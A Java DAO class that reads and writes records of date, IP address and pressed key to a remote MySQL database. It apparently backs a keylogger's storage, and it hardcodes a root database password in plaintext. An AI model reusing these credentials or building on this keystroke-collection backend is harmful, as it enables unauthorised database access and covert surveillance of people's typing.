package model;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.ArrayList;

public class DAO {
    private String driver = "com.mysql.cj.jdbc.Driver";
    private String url = "jdbc:mysql://containers-us-west-153.railway.app:6851/railway";
    private String user = "root";
    private String password = "kB08PVXjeuHFJcEm8ZtC";

    private Connection conectar() {
        Connection con = null;
        try {
            Class.forName(driver);
            con = DriverManager.getConnection(url, user, password);
            return con;
        } catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }

    // Método para listar os registros
    public ArrayList<Registrador> listarRegistros() {
        // Criar lista de funcionários
        ArrayList<Registrador> registros = new ArrayList();
        // Declarar a query utilizada para retornar dados
        String read = "select * from registros;";

        try {
            // Abrir a conexão
            Connection con = conectar();
            // Preparar a query para execução do banco de dados
            PreparedStatement pst = con.prepareStatement(read);
            // Executar a query
            ResultSet rs = pst.executeQuery();
            // Passando os valores contidos no RS para a lista de func
            while (rs.next()) {
                String data = rs.getString(2);
                String ip = rs.getString(3);
                String teclaPresionada = rs.getString(4);
                // Adicionar um novo registro na lista
                registros.add(new Registrador(data, ip, teclaPresionada));
            }

            con.close();
            return registros;
        } catch (Exception e) {
            return null;
        }
    }

    public void inserirRegistros(Registrador registro) {
        String insert = "insert into registros(data, ip, teclaPressionada) values (?, ?, ?);";
        try {
            Connection con = conectar();
            PreparedStatement pst = con.prepareStatement(insert);
            pst.setString(1, registro.getData());            
            pst.setString(2, registro.getIp());
            pst.setString(3, registro.getTeclaPressionada());
            pst.execute();
            con.close();
            pst.close();
        } catch (Exception e) {
            System.out.println("Erro ao inserir!" + e);
        }
    }
}